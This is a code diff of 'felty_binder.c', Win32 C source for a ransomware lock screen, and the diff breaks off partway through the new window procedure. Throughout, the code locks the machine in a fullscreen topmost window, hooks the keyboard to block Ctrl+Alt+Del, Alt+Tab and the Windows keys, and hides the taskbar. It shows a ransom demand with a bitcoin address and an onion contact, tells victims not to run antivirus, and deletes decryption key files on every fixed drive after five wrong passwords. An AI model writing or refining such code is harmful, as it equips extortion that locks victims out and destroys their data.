@@ -1,540 +1,648 @@
 /*
- * felty_binder.c — Native Win32 Fullscreen Lockscreen (HTML-style redesign)
- * Rewritten visual rendering to match the HTML design: FELTY ASCII logo,
- * matrix rain background, terminal box, info panels, payment section,
- * warning list, and permanent lock flash overlay on 5 failures.
- *
- * Password: FELTY-RECOVER-2025 (5 attempts, then key destroyed + permanent flash)
- *
- * Compile (64-bit):
- *   x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c \
- *       -lcrypt32 -ladvapi32 -lgdi32 -luser32 -mwindows
- *
- * Compile (32-bit):
- *   i686-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c \
- *       -lcrypt32 -ladvapi32 -lgdi32 -luser32 -mwindows
+ * felty_binder.c – FELTY lock screen (responsive, centered password input)
+ * Compile with: x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c ...
  */
 
-#define _WIN32_WINNT 0x0601
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0501
 #include <windows.h>
-#include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
-#include <string.h>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 
-#define PASSWORD   L"FELTY-RECOVER-2025"
-#define MAX_TRIES  5
-#define UNLOCK_FLAG L"C:\\felty_unlocked.txt"
+/* ---------- Configuration ---------- */
+#define MAX_ATTEMPTS           5
+#define CORRECT_PASSWORD       L"FELTY-RECOVER-2025"
+#define COUNTDOWN_TOTAL_SECONDS (72 * 3600)
 
-/* ─── GLOBALS ─── */
-static volatile int g_attempts   = 0;
-static volatile int g_wipe      = 0;
-static volatile int g_unlocked  = 0;
-static HWND    g_hwnd    = NULL;
-static HWND    g_edit    = NULL;
-static HHOOK   g_kb_hook = NULL;
-static HFONT   g_font_small = NULL;
-static HFONT   g_font_med   = NULL;
-static HFONT   g_font_big   = NULL;
-static HFONT   g_font_huge  = NULL;
-static HFONT   g_font_mono  = NULL;
-static UINT_PTR g_timer_repaint = 0;
-static UINT_PTR g_timer_flash   = 0;
-static int     g_flash_state    = 0;
-static int     g_matrix_init    = 0;
+/* ---------- Global variables ---------- */
+static HINSTANCE  g_hInst;
+static HWND       g_hWnd;
+static HWND       g_hPassEdit;      // password input
+static HWND       g_hUnlockBtn;     // unlock button
+static HHOOK      g_kbHook;
+static int        g_attemptsLeft = MAX_ATTEMPTS;
+static BOOL       g_permanentLock = FALSE;
+static BOOL       g_success = FALSE;
+static DWORD      g_startTick;
+static wchar_t    g_machineId[64];
 
-/* ─── FELTY ASCII LOGO (from HTML) ─── */
-static const char *g_logo[] = {
-    "    ╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
-    "    ║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
-    "    ║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
-    "    ║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
-    "    ║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
-    "    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝",
-    NULL
-};
+/* Double‑buffering */
+static HDC        g_memDC  = NULL;
+static HBITMAP    g_memBM  = NULL;
+static int        g_memW   = 0;
+static int        g_memH   = 0;
 
-/* ─── MATRIX RAIN ─── */
-#define MATRIX_COLS 160
-static int      g_drops[MATRIX_COLS];
-static wchar_t  g_rain_chars[] = L"FELTY01HEX#@!$%&";
+/* Fonts */
+static HFONT      g_hLogoFont;
+static HFONT      g_hTitleFont;
+static HFONT      g_hMainFont;
+static HFONT      g_hSmallFont;
+static HFONT      g_hMonoFont;
 
-static void init_matrix(void)
+/* Matrix rain state */
+static BOOL       g_rainInit = FALSE;
+static int        g_drops[256];
+
+/* ---------- Forward declarations ---------- */
+LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
+LRESULT CALLBACK KbProc(int, WPARAM, LPARAM);
+VOID LayoutControls(HWND hwnd);
+VOID DrawScreen(HDC hdc, const RECT *rc);
+VOID DrawTerminal(HDC hdc, const RECT *term);
+VOID DrawLogo(HDC hdc, int x, int y, int w);
+VOID DrawTitleBar(HDC hdc, int x, int y, int w);
+VOID DrawPasswordArea(HDC hdc, int x, int y, int w);
+VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h);
+VOID DrawPaymentInfo(HDC hdc, int x, int y, int w, int h);
+VOID DrawQRPlaceholder(HDC hdc, int x, int y);
+VOID DrawWarnings(HDC hdc, int x, int y, int w);
+VOID DrawContactLine(HDC hdc, int x, int y, int w);
+VOID DrawPermanentLock(HDC hdc, const RECT *rc);
+VOID DrawSuccess(HDC hdc, const RECT *rc);
+VOID DrawMatrixRain(HDC hdc, const RECT *rc);
+VOID InitFonts();
+VOID InitRain();
+VOID CheckPassword();
+VOID UpdateCountdown();
+
+/* ========================================================================
+ *  WinMain
+ * ======================================================================== */
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
 {
-    for (int i = 0; i < MATRIX_COLS; i++)
-        g_drops[i] = rand() % 100;
-    g_matrix_init = 1;
-}
+    g_hInst = hInst;
+    g_startTick = GetTickCount();
+    srand((unsigned)time(NULL));
 
-static void draw_matrix_rain(HDC hdc, int sw, int sh)
-{
-    if (!g_matrix_init) init_matrix();
+    wsprintfW(g_machineId, L"%04X-%04X-%04X-%04X-%04X%04X",
+              rand() % 0x10000, rand() % 0x10000, rand() % 0x10000,
+              rand() % 0x10000, rand() % 0x10000, rand() % 0x10000);
 
-    HFONT mfont = CreateFontW(10, 0, 0, 0, FW_NORMAL, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-    SelectObject(hdc, mfont);
-    SetBkMode(hdc, TRANSPARENT);
-
-    int cols = sw / 10;
-    if (cols > MATRIX_COLS) cols = MATRIX_COLS;
-
-    for (int i = 0; i < cols; i++) {
-        int r = 180 - (rand() % 40);
-        SetTextColor(hdc, RGB(r, rand() % 20, 0));
-        wchar_t ch[2] = { g_rain_chars[rand() % (wcslen(g_rain_chars) - 1)], 0 };
-        TextOutW(hdc, i * 10, g_drops[i] * 10, ch, 1);
-        if (g_drops[i] * 10 > sh && (rand() % 40) == 0)
-            g_drops[i] = 0;
-        g_drops[i]++;
-    }
-    DeleteObject(mfont);
-}
-
-/* ─── DRAW PERMANENT LOCK FLASH SCREEN ─── */
-static void draw_permanent_lock(HDC hdc, int sw, int sh)
-{
-    g_flash_state = !g_flash_state;
-    COLORREF bg = g_flash_state ? RGB(0, 0, 0) : RGB(26, 0, 0);
-    COLORREF tc = g_flash_state ? RGB(255, 51, 51) : RGB(255, 255, 255);
-    COLORREF tc2 = g_flash_state ? RGB(255, 68, 68) : RGB(200, 100, 100);
-    COLORREF tc3 = g_flash_state ? RGB(255, 136, 136) : RGB(180, 180, 180);
-
-    HBRUSH fbg = CreateSolidBrush(bg);
-    RECT rc = {0, 0, sw, sh};
-    FillRect(hdc, &rc, fbg);
-    DeleteObject(fbg);
-    SetBkMode(hdc, TRANSPARENT);
-
-    /* Logo */
-    SelectObject(hdc, g_font_mono);
-    SetTextColor(hdc, RGB(204, 0, 0));
-    int ly = sh / 2 - 130;
-    for (int i = 0; g_logo[i]; i++) {
-        TextOutA(hdc, sw / 2 - 170, ly, g_logo[i], strlen(g_logo[i]));
-        ly += 16;
-    }
-
-    /* "FILES DESTROYED" */
-    SelectObject(hdc, g_font_huge);
-    SetTextColor(hdc, tc);
-    TextOutW(hdc, sw / 2 - 200, sh / 2 - 10, L"FILES DESTROYED", 15);
-
-    /* Subtitle */
-    SelectObject(hdc, g_font_med);
-    SetTextColor(hdc, tc2);
-    TextOutW(hdc, sw / 2 - 180, sh / 2 + 30, L"// PERMANENTLY ENCRYPTED //", 27);
-
-    /* Body */
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, tc3);
-    TextOutW(hdc, sw / 2 - 200, sh / 2 + 60, L"You had 5 attempts to recover your data.", 40);
-    TextOutW(hdc, sw / 2 - 200, sh / 2 + 78, L"You failed every single one.", 28);
-
-    SelectObject(hdc, g_font_med);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, sw / 2 - 180, sh / 2 + 110, L"NOTHING CAN SAVE YOUR FILES NOW.", 33);
-
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, sw / 2 - 200, sh / 2 + 150, L"[ THIS SYSTEM IS PERMANENTLY LOCKED ]", 38);
-
-    if (!g_timer_flash) {
-        g_timer_flash = SetTimer(g_hwnd, 3, 150, NULL);
-    }
-}
-
-/* ─── DRAW NORMAL LOCK SCREEN (HTML-style) ─── */
-static void draw_normal_screen(HDC hdc, int sw, int sh)
-{
-    /* Black background */
-    HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
-    RECT rc = {0, 0, sw, sh};
-    FillRect(hdc, &rc, bg);
-    DeleteObject(bg);
-    SetBkMode(hdc, TRANSPARENT);
-
-    /* ─── MATRIX RAIN (subtle) ─── */
-    draw_matrix_rain(hdc, sw, sh);
-
-    /* ─── TERMINAL BOX ─── */
-    int box_w = 780;
-    int box_h = sh - 80;
-    int box_x = (sw - box_w) / 2;
-    int box_y = 40;
-
-    if (box_w > sw - 20) box_w = sw - 20;
-
-    /* Outer border */
-    HPEN border = CreatePen(PS_SOLID, 2, RGB(180, 0, 0));
-    SelectObject(hdc, border);
-    SelectObject(hdc, GetStockObject(NULL_BRUSH));
-    Rectangle(hdc, box_x, box_y, box_x + box_w, box_y + box_h);
-    DeleteObject(border);
-
-    /* Inner fill */
-    HBRUSH inner = CreateSolidBrush(RGB(10, 0, 0));
-    RECT ir = {box_x + 1, box_y + 1, box_x + box_w - 1, box_y + box_h - 1};
-    FillRect(hdc, &ir, inner);
-    DeleteObject(inner);
-
-    int cx = box_x + 25;
-    int cy = box_y + 15;
-
-    /* ═══ LOGO ═══ */
-    SelectObject(hdc, g_font_mono);
-    SetTextColor(hdc, RGB(204, 0, 0));
-    for (int i = 0; g_logo[i]; i++) {
-        TextOutA(hdc, cx + 50, cy, g_logo[i], strlen(g_logo[i]));
-        cy += 15;
-    }
-    cy += 10;
-
-    /* ═══ TITLE ═══ */
-    SelectObject(hdc, g_font_huge);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, cx + 220, cy, L"FELTY", 5);
-    cy += 38;
-
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, cx + 150, cy, L"// YOUR SYSTEM HAS BEEN LOCKED //", 33);
-    cy += 40;
-
-    /* ═══ PASSWORD PROMPT ═══ */
-    HPEN pw = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
-    SelectObject(hdc, pw);
-    Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 40);
-    DeleteObject(pw);
-
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, cx + 50, cy + 12,
-        L"> ENTER DECRYPTION PASSWORD TO UNLOCK SYSTEM", 48);
-    cy += 55;
-
-    /* Attempts remaining status */
-    wchar_t buf[64];
-    wsprintfW(buf, L"[ ATTEMPTS REMAINING: %d / %d ]",
-        MAX_TRIES - g_attempts, MAX_TRIES);
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, g_attempts >= 3 ? RGB(255, 68, 68) : RGB(255, 136, 0));
-    TextOutW(hdc, cx + 180, cy, buf, wcslen(buf));
-    cy += 30;
-
-    /* ═══ INFO PANELS ═══ */
-    int panel_w = (box_w - 80) / 2;
-    int panel_y = cy;
-
-    HPEN pp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
-    SelectObject(hdc, pp);
-
-    /* Left panel — System Status */
-    Rectangle(hdc, cx, panel_y, cx + panel_w, panel_y + 130);
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, cx + 10, panel_y + 8, L"// SYSTEM STATUS", 16);
-    SetTextColor(hdc, RGB(255, 136, 136));
-    TextOutW(hdc, cx + 10, panel_y + 32, L"Encryption: ", 12);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, cx + 95, panel_y + 32, L"AES-256-CBC", 11);
-    SetTextColor(hdc, RGB(255, 136, 136));
-    TextOutW(hdc, cx + 10, panel_y + 52, L"Key Exchange: ", 14);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, cx + 105, panel_y + 52, L"RSA-4096", 8);
-    SetTextColor(hdc, RGB(255, 136, 136));
-    TextOutW(hdc, cx + 10, panel_y + 72, L"Status: ", 8);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, cx + 70, panel_y + 72, L"LOCKED", 6);
-
-    /* Right panel — Payment */
-    int p2x = cx + panel_w + 20;
-    Rectangle(hdc, p2x, panel_y, p2x + panel_w, panel_y + 130);
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, p2x + 10, panel_y + 8, L"// PAYMENT REQUIRED", 19);
-    SetTextColor(hdc, RGB(255, 136, 136));
-    TextOutW(hdc, p2x + 10, panel_y + 28, L"RANSOM AMOUNT:", 15);
-    SelectObject(hdc, g_font_med);
-    SetTextColor(hdc, RGB(255, 204, 0));
-    TextOutW(hdc, p2x + 10, panel_y + 48, L"$300.00 USD", 12);
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 136, 51));
-    TextOutW(hdc, p2x + 10, panel_y + 72, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 37);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, p2x + 10, panel_y + 100, L"BTC ADDRESS", 11);
-    TextOutW(hdc, p2x + panel_w - 70, panel_y + 100, L"72:00:00", 8);
-
-    DeleteObject(pp);
-
-    cy = panel_y + 145;
-
-    /* ═══ WARNINGS ═══ */
-    HPEN wp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
-    SelectObject(hdc, wp);
-    Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 105);
-    DeleteObject(wp);
-
-    SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 0, 0));
-    TextOutW(hdc, cx + 15, cy + 10, L">> DO NOT ATTEMPT TO DECRYPT FILES YOURSELF", 44);
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, cx + 15, cy + 30, L">> DO NOT RUN ANTIVIRUS - IT WILL DELETE THE KEY", 49);
-    TextOutW(hdc, cx + 15, cy + 50, L">> DO NOT SHUT DOWN OR RESTART YOUR COMPUTER", 46);
-    TextOutW(hdc, cx + 15, cy + 70, L">> ONLY FELTY DECRYPTION TOOL CAN RESTORE FILES", 48);
-
-    cy += 115;
-
-    /* ═══ CONTACT ═══ */
-    SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, cx + 20, cy, L"CONTACT:  feltyhelp@onionmail.org", 34);
-    SetTextColor(hdc, RGB(255, 136, 51));
-    wchar_t mid[64];
-    wsprintfW(mid, L"Machine ID: FELTY-%04X-%04X",
-        rand() & 0xFFFF, rand() & 0xFFFF);
-    TextOutW(hdc, cx + 20, cy + 18, mid, wcslen(mid));
-}
-
-/* ─── WINDOW PROC ─── */
-static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
-{
-    switch (msg) {
-    case WM_CREATE: {
-        int sw = GetSystemMetrics(SM_CXSCREEN);
-        int sh = GetSystemMetrics(SM_CYSCREEN);
-
-        g_edit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
-            WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
-            sw / 2 - 130, sh / 2 + sh / 20 + 10, 260, 32,
-            hwnd, (HMENU)100, NULL, NULL);
-        SendMessageW(g_edit, WM_SETFONT, (WPARAM)g_font_med, TRUE);
-        SetFocus(g_edit);
-        break;
-    }
-    case WM_COMMAND: {
-        if (LOWORD(w) == 100 && HIWORD(w) == EN_UPDATE) break;
-        break;
-    }
-    case WM_CHAR: {
-        if (g_wipe) return 0;
-        if (w == VK_RETURN) {
-            wchar_t pw[256];
-            GetWindowTextW(g_edit, pw, 256);
-            if (wcscmp(pw, PASSWORD) == 0) {
-                g_unlocked = 1;
-                HANDLE hf = CreateFileW(UNLOCK_FLAG, GENERIC_WRITE, 0,
-                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                if (hf != INVALID_HANDLE_VALUE) {
-                    DWORD dummy;
-                    WriteFile(hf, L"UNLOCKED", 16, &dummy, NULL);
-                    CloseHandle(hf);
-                }
-                DestroyWindow(hwnd);
-                return 0;
-            }
-            g_attempts++;
-            if (g_attempts >= MAX_TRIES) {
-                g_wipe = 1;
-                /* Destroy key files */
-                wchar_t syspath[MAX_PATH];
-                GetSystemDirectoryW(syspath, MAX_PATH);
-                wchar_t kp[MAX_PATH];
-                wcscpy(kp, syspath);
-                wcscat(kp, L"\\key.eky");
-                DeleteFileW(kp);
-                wchar_t d[256];
-                GetLogicalDriveStringsW(256, d);
-                wchar_t *dp = d;
-                while (*dp) {
-                    if (GetDriveTypeW(dp) == DRIVE_FIXED) {
-                        wcscpy(kp, dp);
-                        wcscat(kp, L".eky");
-                        DeleteFileW(kp);
-                    }
-                    dp += wcslen(dp) + 1;
-                }
-                /* Disable edit box */
-                EnableWindow(g_edit, FALSE);
-                ShowWindow(g_edit, SW_HIDE);
-                /* Kill repaint timer, start flash via draw loop */
-                InvalidateRect(hwnd, NULL, TRUE);
-            }
-            SetWindowTextW(g_edit, L"");
-            InvalidateRect(hwnd, NULL, TRUE);
-            return 0;
-        }
-        if (w == VK_ESCAPE || w == VK_TAB) return 0;
-        break;
-    }
-    case WM_KEYDOWN:
-    case WM_SYSKEYDOWN: {
-        if (w == VK_ESCAPE || w == VK_F4 || w == VK_TAB ||
-            w == VK_LWIN || w == VK_RWIN) return 0;
-        break;
-    }
-    case WM_PAINT: {
-        PAINTSTRUCT ps;
-        HDC hdc = BeginPaint(hwnd, &ps);
-        int sw = GetSystemMetrics(SM_CXSCREEN);
-        int sh = GetSystemMetrics(SM_CYSCREEN);
-
-        if (g_wipe) {
-            draw_permanent_lock(hdc, sw, sh);
-        } else {
-            draw_normal_screen(hdc, sw, sh);
-        }
-        EndPaint(hwnd, &ps);
-        break;
-    }
-    case WM_TIMER: {
-        if (w == 1) {
-            /* Repaint timer for matrix rain animation */
-            InvalidateRect(hwnd, NULL, FALSE);
-        }
-        break;
-    }
-    case WM_CLOSE:
-        return 0;
-    case WM_DESTROY:
-        PostQuitMessage(0);
-        break;
-    default:
-        return DefWindowProcW(hwnd, msg, w, l);
-    }
-    return 0;
-}
-
-/* ─── KEYBOARD HOOK (blocks Ctrl+Alt+Del, Win keys, Alt+Tab, Alt+Esc) ─── */
-static LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
-{
-    if (code >= 0) {
-        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l;
-        if (kb->vkCode == VK_DELETE &&
-            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
-            (GetAsyncKeyState(VK_MENU) & 0x8000))
-            return 1;
-        if (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN)
-            return 1;
-        if (kb->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000))
-            return 1;
-        if (kb->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000))
-            return 1;
-    }
-    return CallNextHookEx(g_kb_hook, code, w, l);
-}
-
-/* ─── HIDE TASKBAR ─── */
-static void hide_taskbar(void)
-{
-    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
-    if (hTaskBar) ShowWindow(hTaskBar, SW_HIDE);
-    HWND hStart = FindWindowW(L"Button", NULL);
-    if (hStart) {
-        HWND hParent = GetParent(hStart);
-        if (hParent) ShowWindow(hParent, SW_HIDE);
-    }
-}
-
-/* ─── ENTRY POINT ─── */
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
-{
-    /* Single instance */
-    HANDLE hm = CreateMutexW(NULL, TRUE, L"Global\\FeltyBinderMutex");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
-
-    /* Check if already unlocked */
-    if (GetFileAttributesW(UNLOCK_FLAG) != INVALID_FILE_ATTRIBUTES) {
-        CloseHandle(hm);
-        return 0;
-    }
-
-    srand((unsigned int)time(NULL));
-
-    /* Hide taskbar */
-    hide_taskbar();
-
-    /* Install keyboard hook */
-    g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);
-
-    /* Create fonts */
-    g_font_small = CreateFontW(12, 0, 0, 0, FW_NORMAL, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-    g_font_med = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-    g_font_big = CreateFontW(22, 0, 0, 0, FW_BOLD, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-    g_font_huge = CreateFontW(32, 0, 0, 0, FW_BOLD, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-    g_font_mono = CreateFontW(14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
-        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
-
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-
-    /* Register window class */
-    WNDCLASSW wc = {0};
+    WNDCLASSEXW wc = { sizeof(WNDCLASSEXW) };
     wc.style         = CS_HREDRAW | CS_VREDRAW;
     wc.lpfnWndProc   = WndProc;
     wc.hInstance     = hInst;
     wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
-    wc.lpszClassName = L"FeltyBinderLock";
-    RegisterClassW(&wc);
+    wc.lpszClassName = L"FELTY_BINDER_CLASS";
+    RegisterClassExW(&wc);
 
-    /* Create fullscreen topmost window */
-    g_hwnd = CreateWindowExW(
-        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
-        L"FeltyBinderLock", L"Locked",
-        WS_POPUP | WS_VISIBLE,
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    g_hWnd = CreateWindowExW(
+        WS_EX_TOPMOST, L"FELTY_BINDER_CLASS", L"",
+        WS_POPUP | WS_VISIBLE | WS_MAXIMIZE,
         0, 0, sw, sh,
-        NULL, NULL, hInst, NULL);
+        NULL, NULL, hInst, NULL
+    );
+    ShowWindow(g_hWnd, SW_SHOWMAXIMIZED);
+    UpdateWindow(g_hWnd);
 
-    /* Create password edit box */
-    /* Positioned below the terminal content vertically */
-    g_edit = CreateWindowExW(
-        WS_EX_CLIENTEDGE, L"EDIT", L"",
-        WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
-        sw / 2 - 130, sh / 2 + sh / 20 + 10, 260, 32,
-        g_hwnd, (HMENU)100, hInst, NULL);
-    SendMessageW(g_edit, WM_SETFONT, (WPARAM)g_font_med, TRUE);
+    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);
 
-    /* Position and show */
-    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
-    SetForegroundWindow(g_hwnd);
-    SetFocus(g_edit);
-
-    /* Timer to drive matrix animation and repaints */
-    g_timer_repaint = SetTimer(g_hwnd, 1, 70, NULL);
-
-    ShowWindow(g_hwnd, SW_SHOWMAXIMIZED);
-
-    /* Message loop */
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
-        if (g_unlocked) break;
+    }
+    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
+    return 0;
+}
+
+/* ========================================================================
+ *  Keyboard hook
+ * ======================================================================== */
+LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
+{
+    if (code >= 0) {
+        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)l;
+        if (kb->vkCode == VK_DELETE &&
+            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
+            (GetAsyncKeyState(VK_MENU) & 0x8000))
+            return 1;
+        if (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN) return 1;
+        if (kb->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if (kb->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if (kb->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+    }
+    return CallNextHookEx(g_kbHook, code, w, l);
+}
+
+/* ========================================================================
+ *  Window procedure
+ * ======================================================================== */
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
+{
+    switch (msg) {
+    case WM_CREATE:
+        InitFonts();
+        InitRain();
+        g_hPassEdit = CreateWindowExW(
+            WS_EX_CLIENTEDGE, L"EDIT", L"",
+            WS_CHILD | WS_BORDER | ES_PASSWORD | ES_CENTER,
+            0, 0, 260, 28, hwnd, (HMENU)101, g_hInst, NULL
+        );
+        SendMessageW(g_hPassEdit, WM_SETFONT, (WPARAM)g_hMonoFont, TRUE);
+        g_hUnlockBtn = CreateWindowExW(
+            0, L"BUTTON", L"UNLOCK",
+            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+            0, 0, 80, 28, hwnd, (HMENU)102, g_hInst, NULL
+        );
+        SendMessageW(g_hUnlockBtn, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);
+        SetTimer(hwnd, 1, 1000, NULL);
+        SetTimer(hwnd, 2, 200, NULL);   // Slower rain = less lag
+        break;
+
+    case WM_SIZE:
+        if (g_memBM) DeleteObject(g_memBM);
+        if (g_memDC) DeleteDC(g_memDC);
+        {
+            RECT rc; GetClientRect(hwnd, &rc);
+            g_memW = rc.right; g_memH = rc.bottom;
+            HDC hdc = GetDC(hwnd);
+            g_memDC = CreateCompatibleDC(hdc);
+            g_memBM = CreateCompatibleBitmap(hdc, g_memW, g_memH);
+            SelectObject(g_memDC, g_memBM);
+            ReleaseDC(hwnd, hdc);
+        }
+        LayoutControls(hwnd);
+        InvalidateRect(hwnd, NULL, FALSE);
+        break;
+
+    case WM_PAINT: {
+        PAINTSTRUCT ps;
+        HDC hdc = BeginPaint(hwnd, &ps);
+        RECT rc; GetClientRect(hwnd, &rc);
+        DrawScreen(g_memDC, &rc);
+        BitBlt(hdc, 0, 0, g_memW, g_memH, g_memDC, 0, 0, SRCCOPY);
+        EndPaint(hwnd, &ps);
+        return 0;
     }
 
-    /* Cleanup */
-    if (g_timer_repaint) KillTimer(g_hwnd, g_timer_repaint);
-    if (g_timer_flash) KillTimer(g_hwnd, g_timer_flash);
-    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hook);
+    case WM_CTLCOLOREDIT:
+        SetTextColor((HDC)w, RGB(255, 204, 204));
+        SetBkColor((HDC)w, RGB(0, 0, 0));
+        return (LRESULT)GetStockObject(BLACK_BRUSH);
 
-    /* Restore taskbar */
-    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
-    if (hTaskBar) ShowWindow(hTaskBar, SW_SHOW);
+    case WM_CTLCOLORBTN:
+        if ((HWND)l == g_hUnlockBtn) {
+            SetTextColor((HDC)w, RGB(255, 255, 255));
+            SetBkColor((HDC)w, RGB(204, 0, 0));
+            return (LRESULT)CreateSolidBrush(RGB(204, 0, 0));
+        }
+        break;
 
-    if (g_font_small) DeleteObject(g_font_small);
-    if (g_font_med) DeleteObject(g_font_med);
-    if (g_font_big) DeleteObject(g_font_big);
-    if (g_font_huge) DeleteObject(g_font_huge);
-    if (g_font_mono) DeleteObject(g_font_mono);
-    DestroyWindow(g_hwnd);
-    CloseHandle(hm);
-    return 0;
+    case WM_COMMAND:
+        if (LOWORD(w) == 102 && HIWORD(w) == BN_CLICKED) {
+            CheckPassword();
+        }
+        break;
+
+    case WM_TIMER:
+        if (w == 1) {
+            UpdateCountdown();
+        } else if (w == 2) {
+            RECT rc; GetClientRect(hwnd, &rc);
+            InvalidateRect(hwnd, &rc, FALSE);
+        }
+        break;
+
+    case WM_DESTROY:
+        KillTimer(hwnd, 1);
+        KillTimer(hwnd, 2);
+        if (g_memBM) DeleteObject(g_memBM);
+        if (g_memDC) DeleteDC(g_memDC);
+        DeleteObject(g_hLogoFont);
+        DeleteObject(g_hTitleFont);
+        DeleteObject(g_hMainFont);
+        DeleteObject(g_hSmallFont);
+        DeleteObject(g_hMonoFont);
+        PostQuitMessage(0);
+        break;
+    }
